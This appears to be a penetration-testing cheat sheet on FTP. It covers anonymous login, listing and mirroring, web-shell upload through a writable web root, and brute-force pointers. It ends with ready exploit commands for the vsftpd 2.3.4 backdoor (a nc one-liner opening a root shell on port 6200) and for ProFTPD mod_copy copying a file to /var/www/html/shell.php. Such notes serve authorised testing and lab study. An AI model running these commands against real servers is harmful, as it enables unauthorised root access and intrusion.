# FTP

## Anonymous login
```bash
nmap -p21 -sV --script ftp-anon <IP>
ftp <IP>        # user: anonymous, pw: any email
```
```text
pwd
ls -la
binary
get notes.txt
bye
```

## curl
```bash
curl -v 'ftp://<IP>/'
curl --list-only 'ftp://<IP>/pub/'
curl -o notes.txt 'ftp://<IP>/pub/notes.txt'
```
- `--list-only` may omit directories/hidden files.

## Write access and mirroring
```text
put test.txt
```
- Writable FTP root that is also a web root: upload a marker, request it over HTTP, then the real shell ([shells](../foothold/shells.md)). Windows/IIS: `.aspx`; PHP/Apache: matching extension.
- `binary` before uploading executables (ASCII mode corrupts them).

```bash
wget -m --no-passive 'ftp://anonymous:anonymous@<IP>/'
wget -m 'ftp://<USER>:<PW>@<IP>/'
```
- Passive hang or `Entering Passive Mode` errors → `--no-passive`. Remote file names can contain spaces: check `ls -R` output against what was fetched.
- Hidden files: `ls -la` inside the `ftp` session; `curl --list-only` can omit them entirely — don't trust an empty curl listing as "nothing here."
- Active vs passive: `curl` defaults to passive (`PASV`); force active with `curl --ftp-port -`. Classic `ftp` client: type `passive` interactively to toggle. Passive needs the server to open a random high port back to you — behind restrictive egress/NAT, active may work when passive hangs, or vice versa.

## No creds yet
- Default/weak creds: product docs often list a default FTP account; try only those first, record lockout behaviour → [online-logins](../passwords/online-logins.md).
- Anonymous already covered above; if that's closed, brute force is next: [online-logins](../passwords/online-logins.md) (hydra `ftp` module).

## Version leads
Confirm the version banner (`nmap -sV`) before trying either — both are specific-build issues, not general FTP behavior.

| Clue | Issue |
| --- | --- |
| vsftpd **2.3.4** | Backdoored tarball (2011): a `:)` anywhere in the username opens a root shell on **6200/tcp** (CVE-2011-2523) |
| ProFTPD, `mod_copy` enabled | `SITE CPFR`/`SITE CPTO` copy files server-side as the FTP process — bypasses the FTP root for both source and dest (CVE-2015-3306 / CVE-2019-12815) |

```bash
(echo 'USER x:)'; sleep 1; echo 'PASS x'; sleep 1) | nc <IP> 21
nc <IP> 6200
```
```text
SITE CPFR <existing-file-readable-by-the-ftp-process>
SITE CPTO /var/www/html/shell.php
```
- ProFTPD copy needs an existing file to use as the source and the web root readable by the FTP process — not a straight upload-of-new-content primitive by itself.
